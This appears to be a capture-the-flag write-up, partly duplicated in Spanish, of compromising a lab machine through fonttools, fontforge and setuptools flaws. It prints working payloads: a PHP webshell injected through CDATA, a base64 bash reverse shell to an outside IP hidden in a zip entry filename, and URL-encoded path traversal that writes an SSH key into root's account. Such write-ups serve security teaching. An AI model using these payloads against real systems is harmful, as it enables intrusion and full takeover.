Exploitation Summary

The attack started with a web application that accepted font design files for processing. By discovering a .git directory exposed on a portal subdomain, I recovered credentials from a past commit, gaining authenticated access to an internal file management portal.

With authenticated access in hand, I turned back to the main site's font upload functionality. Using GHSA-768j-98cg-p3fv, a path traversal vulnerability in the fonttools varLib library, I crafted a malicious .designspace file that wrote a PHP webshell directly onto the portal's public directory. The webshell payload was injected by abusing XML CDATA sections in labelname elements, which got written verbatim into the output PHP file, granting remote code execution as www-data.

From there, monitoring with pspy64 revealed that user steve periodically processes uploaded font files using fontforge version 20230101, which is vulnerable to command injection via filename (CVE-2024-25081). Since filenames are restricted to alphanumeric characters, I embedded a base64-encoded reverse shell inside a zip file whose internal entry had the malicious filename. A zip slip approach caused fontforge to process the injected filename, triggering the command injection and giving me a shell as steve.

Finally, steve had sudo rights to run a Python script that used setuptools version 78.1.0's PackageIndex().download() to fetch a URL and save it to disk. This version is vulnerable to CVE-2025-47273, a path traversal via URL-encoded slashes. By serving my SSH public key from a custom HTTP server and passing a URL with the target path encoded in it, I wrote my key into /root/.ssh/authorized_keys as root, then connected via SSH to complete the machine.

Initial Access — fonttools varLib Arbitrary File Write (GHSA-768j-98cg-p3fv)

The advisory at GHSA-768j-98cg-p3fv describes a path traversal vulnerability in fonttools varLib: the filename attribute of a <variable-font> element in a .designspace file is used as-is when writing the output, without sanitization. This allows writing the generated font binary to an arbitrary path on the filesystem.

Knowing the web root structure from the CSS comment, I craft a .designspace file that targets /var/www/portal.variatype.htb/public/files/ as the write destination — a directory I'll confirm is writable since the portal serves uploaded files from there.

Step 2 — Inject a PHP webshell via XML CDATA

The advisory also explains how to inject arbitrary PHP code into the output file: the labelname element uses CDATA sections that are written verbatim into the output. By carefully nesting CDATA sections, PHP code can be embedded without being escaped by the XML parser.

The technique from the advisory looks like this:

<labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]]]><![CDATA[>]]></labelname>

Adapting this to a functional webshell, my full working payload is:

    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']) ?>]]]]><![CDATA[>]]></labelname>
      <labelname xml:lang="fr">MEOW2</labelname>

Lateral Movement — fontforge Command Injection (CVE-2024-25081)

Now running as www-data, I upload pspy64 and monitor process activity. Every two minutes, user steve (UID=1000) runs a font processing script:

UID=1000 | mkdir -p /home/steve/processed_fonts /home/steve/quarantine /home/steve/logs
UID=1000 | /bin/bash /home/steve/bin/process_client_submissions.sh

I can't read the script directly from steve's home directory, but there's a copy in /opt that is readable. The critical section of the script is:

if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
..."

The variable $file — which is the filename of the uploaded file — is interpolated directly into a shell command without sanitization. Checking the installed version of fontforge:

www-data@variatype:/opt$ /usr/local/src/fontforge/build/bin/fontforge --version
Version: 20230101

Version 20230101 is vulnerable to command injection via filename substitution ($()) as described in CVE-2024-25081. The shell expands $(...) constructs inside the filename before passing it to fontforge.

Understanding the Filename Restriction

The script enforces a strict naming policy before processing any file:

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
    log "QUARANTINE: Filename contains invalid characters: $file"
    mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
    continue
fi

Characters like $, (, ), spaces, and / are all blocked — making a direct injection via filename impossible. However, the script also processes archive files by first extracting them:

EXTENSIONS=(
  "*.ttf" "*.otf" "*.woff" "*.woff2"
  "*.zip" "*.tar" "*.tar.gz"
  "*.sfd"
)

When a .zip is detected, fontforge itself performs the extraction, as confirmed by pspy64:

UID=1000 | sh -c unzip -l /var/www/portal.variatype.htb/public/files/xd.zip > /tmp/ffarchive-6673-1/ff-archive-table-of-contents

The naming pattern of the temp directory (ffarchive-) confirms fontforge is the one running unzip. After extraction, fontforge will attempt to open the extracted file — and the extracted filename is controlled by what's stored inside the zip, bypassing the regex check on the outer zip filename entirely. This is a zip slip variant.

Crafting the Payload

Since the injected filename must contain characters like $, (, and ), but also a base64-encoded command (which may contain + and = but avoids most special chars), I encode the reverse shell in base64 and wrap it in a bash -c pipe:

The base64 payload decodes to:

bash -c "bash -i >& /dev/tcp/10.10.14.129/443 0>&1"

The malicious filename inside the zip is:

$(echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQzIDA+JjEiCg== | base64 -d | bash).ttf

I create a zip archive named xdd.zip containing a file with this name, drop it into /var/www/portal.variatype.htb/public/files/ via the webshell, and set up a netcat listener on port 443.

After at most two minutes, the cron fires. pspy64 confirms the injection:

UID=1000 | sh -c ( cd /tmp/ffarchive-7123-1 ; unzip /var/www/portal.variatype.htb/public/files/xdd.zip $(echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQzIDA+JjEiCg== | base64 -d | bash).ttf ) > /dev/null

My listener catches a shell as steve. Since the shell is unstable and drops after a short time, I immediately add my SSH public key to /home/steve/.ssh/authorized_keys for persistence before it dies, then reconnect via SSH.

Privilege Escalation — setuptools Arbitrary File Write (CVE-2025-47273)

Checking sudo privileges as steve:

steve@variatype:~$ sudo -l
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

The script installs font validation plugins by downloading a URL provided as argument. Its usage message is:

Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>
Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py

The only validation checks on the URL are:

if not is_valid_url(plugin_url):
    print("[-] Invalid URL. Must start with http:// or https://")
    sys.exit(1)

if plugin_url.count('/') > 10:
    print("[-] Suspiciously long URL. Aborting.")
    sys.exit(1)

The slash count limit is worth noting — if an exploit needed more than 10 slashes in the URL one could theoretically use a redirect proxy to reach the final malicious URL, though it won't be necessary here.

The download itself is handled by setuptools' PackageIndex():

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)
    logging.info(f"Attempting to install plugin from: {plugin_url}")
    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")

Checking the installed version of setuptools:

steve@variatype:/opt/font-tools$ pip show setuptools
Name: setuptools
Version: 78.1.0

Version 78.1.0 is vulnerable to CVE-2025-47273: the PackageIndex().download() method uses the URL path as the destination filename without properly decoding and sanitizing percent-encoded path separators. By URL-encoding / as %2F in the path portion of the URL, the final file is written to the decoded path — i.e., an arbitrary location on the filesystem. References: SNYK-PYTHON-SETUPTOOLS-9964606.

Proof of Concept Verification

Before targeting root's SSH directory, I confirm the primitive works. I start a custom Python HTTP server that returns a fixed payload body regardless of the requested path:

from http.server import HTTPServer, BaseHTTPRequestHandler

class CatchAllHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        response_text = "mypayload"
        self.wfile.write(response_text.encode("utf-8"))

def run(port=80):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CatchAllHandler)
    print(f"Starting server on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server.")
        httpd.server_close()

if __name__ == "__main__":
    run()

I call the sudo script with a URL pointing to my server, with the target path URL-encoded in the URL path:

steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
    http://10.10.14.129/%2Ftmp%2Fpwned

[INFO] Attempting to install plugin from: http://10.10.14.129/%2Ftmp%2Fpwned
[INFO] Downloading http://10.10.14.129/%2Ftmp%2Fpwned
[INFO] Plugin installed at: /tmp/pwned
[+] Plugin installed successfully.

The file is owned by root and contains exactly my served payload:

-rw-r--r-- 1 root root 9 /tmp/pwned
steve@variatype:~$ cat /tmp/pwned
mypayload

The primitive is confirmed: whatever the HTTP server returns gets written to the decoded path, as root.

Resumen de Explotación

El ataque comenzó con una aplicación web que aceptaba archivos de diseño tipográfico para procesarlos. Descubriendo un directorio .git expuesto en un subdominio de portal, recuperé credenciales de un commit anterior, obteniendo acceso autenticado a un portal interno de gestión de archivos.

Con acceso autenticado en mano, volví a la funcionalidad de subida de fuentes del sitio principal. Usando GHSA-768j-98cg-p3fv, una vulnerabilidad de path traversal en la librería fonttools varLib, elaboré un archivo .designspace malicioso que escribió una webshell PHP directamente en el directorio público del portal. El payload de la webshell se inyectó abusando de secciones CDATA de XML en elementos labelname, que quedaron escritos literalmente en el archivo PHP resultante, dándome ejecución remota de código como www-data.

Desde allí, monitorizando con pspy64 observé que el usuario steve procesa periódicamente archivos de fuentes usando fontforge versión 20230101, que es vulnerable a inyección de comandos mediante el nombre de archivo (CVE-2024-25081). Como los nombres de archivo están restringidos a caracteres alfanuméricos, embebí una reverse shell codificada en base64 dentro de un archivo zip cuya entrada interna tenía el nombre de archivo malicioso. Un enfoque de zip slip provocó que fontforge procesara el nombre inyectado, disparando la inyección de comandos y dándome una shell como steve.

Finalmente, steve tenía permisos sudo para ejecutar un script Python que usaba PackageIndex().download() de setuptools versión 78.1.0 para descargar una URL y guardarla en disco. Esta versión es vulnerable a CVE-2025-47273, un path traversal mediante slashes codificados en URL. Sirviendo mi clave pública SSH desde un servidor HTTP personalizado y pasando una URL con la ruta destino codificada en ella, escribí mi clave en /root/.ssh/authorized_keys como root, y me conecté por SSH para completar la máquina.

La variable $file — que corresponde al nombre del archivo subido — se interpola directamente en un comando de shell sin saneamiento. Comprobando la versión instalada de fontforge:

www-data@variatype:/opt$ /usr/local/src/fontforge/build/bin/fontforge --version

La versión 20230101 es vulnerable a inyección de comandos mediante sustitución de comandos en el nombre de archivo ($()) tal como describe CVE-2024-25081. El shell expande las construcciones $(...) dentro del nombre de archivo antes de pasarlo a fontforge.

Entendiendo la Restricción de Nombres de Archivo

El script aplica una política de nomenclatura estricta antes de procesar cualquier archivo:

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
    log "QUARANTINE: Filename contains invalid characters: $file"
    mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
    continue
fi

Caracteres como $, (, ), espacios y / están todos bloqueados, lo que hace imposible una inyección directa mediante el nombre de archivo. Sin embargo, el script también procesa archivos comprimidos extrayéndolos primero:

EXTENSIONS=(
  "*.ttf" "*.otf" "*.woff" "*.woff2"
  "*.zip" "*.tar" "*.tar.gz"
  "*.sfd"
)

Cuando se detecta un .zip, es el propio fontforge quien realiza la extracción, tal como confirma pspy64:

UID=1000 | sh -c unzip -l /var/www/portal.variatype.htb/public/files/xd.zip > /tmp/ffarchive-6673-1/ff-archive-table-of-contents

El patrón de nomenclatura del directorio temporal (ffarchive-) confirma que es fontforge quien ejecuta unzip. Tras la extracción, fontforge intentará abrir el archivo extraído — y el nombre del archivo extraído está controlado por lo que hay almacenado dentro del zip, saltándose completamente la comprobación del regex sobre el nombre del zip exterior. Esto es una variante de zip slip.

Escalada de Privilegios — Escritura Arbitraria de Archivos en setuptools (CVE-2025-47273)

Compruebo los privilegios sudo de steve:

steve@variatype:~$ sudo -l
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

El script instala plugins de validación de fuentes descargando una URL proporcionada como argumento. Su mensaje de uso es:

Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>
Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py

Las únicas comprobaciones de validación sobre la URL son:

if not is_valid_url(plugin_url):
    print("[-] Invalid URL. Must start with http:// or https://")
    sys.exit(1)

if plugin_url.count('/') > 10:
    print("[-] Suspiciously long URL. Aborting.")
    sys.exit(1)

El límite de slashes es digno de mención — si un exploit necesitara más de 10 slashes en la URL, teóricamente se podría usar un proxy de redirección para llegar a la URL final maliciosa, aunque no será necesario aquí.

La descarga en sí la gestiona PackageIndex() de setuptools:

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)
    logging.info(f"Attempting to install plugin from: {plugin_url}")
    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")

Comprobando la versión instalada de setuptools:

steve@variatype:/opt/font-tools$ pip show setuptools
Name: setuptools
Version: 78.1.0

La versión 78.1.0 es vulnerable a CVE-2025-47273: el método PackageIndex().download() usa la ruta de la URL como nombre de archivo de destino sin decodificar y sanear correctamente los separadores de ruta codificados en porcentaje. Al codificar / como %2F en la parte de la ruta de la URL, el archivo final se escribe en la ruta decodificada — es decir, en una ubicación arbitraria del sistema de archivos. Referencias: SNYK-PYTHON-SETUPTOOLS-9964606.

Verificación de la Prueba de Concepto

Antes de apuntar al directorio SSH de root, confirmo que el primitivo funciona. Arranco un servidor HTTP personalizado de Python que devuelve un cuerpo de respuesta fijo independientemente de la ruta solicitada:

from http.server import HTTPServer, BaseHTTPRequestHandler

class CatchAllHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        response_text = "mypayload"
        self.wfile.write(response_text.encode("utf-8"))

def run(port=80):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CatchAllHandler)
    print(f"Starting server on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server.")
        httpd.server_close()

if __name__ == "__main__":
    run()
